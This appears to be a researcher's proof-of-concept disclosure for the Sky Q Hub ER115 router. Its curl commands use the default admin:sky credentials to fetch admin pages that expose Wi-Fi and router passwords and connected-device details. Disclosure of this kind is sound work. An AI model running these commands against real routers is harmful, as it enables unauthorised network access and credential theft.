# MikuLeak - CWE 798 (Use Of Default/Hardcoded Credentials), CWE 306/287 (Missing Authentication for Critical Function / Improper Authentication)
# CWE 290/863 (Authentication Bypass by Spoofing / Incorrect Authorization),
# CWE 200 (Exposure Of Sensitive Information To An Unauthorized Actor)

# I've been holding this bug back for 2 months, time constraints/wanting to find an interesting bug to chain with this before release

# Affected devices: Sky Q Hub ER115, possibly also the SR102 and ER110, haven't tested

# Unenforced SessionKey/adminLoggedIp check, combined with CWE 798
curl 192.168.0.1 -u admin:sky

# Proof of the 'file pull' bug
curl 192.168.0.1 -u admin:sky http://192.168.0.1/sky_wan_setup.html

# Proof Of CWE 200 - passwords, the firmware version, router serial number, WAN IP, SSID/Password, connected devices with MAC adresses, exposed in plaintext JS source code
curl 192.168.0.1 -u admin:sky http://192.168.0.1/sky_set_password.html

# Even though the admin account is not a backdoor, I'm calling it one for two reasons:

# 1. Even though it is documented (one Sky forum, many hobbyist things, SkyFail), casual users wouldn't know about it
# 2. Most users wouldn't know about this password (because of Reason 1), so they wouldn't change it, meaning it could lead to persistent malicious network access

# Probably a forever day, even if I chuck it on VulnCheck, and get a CVE ID

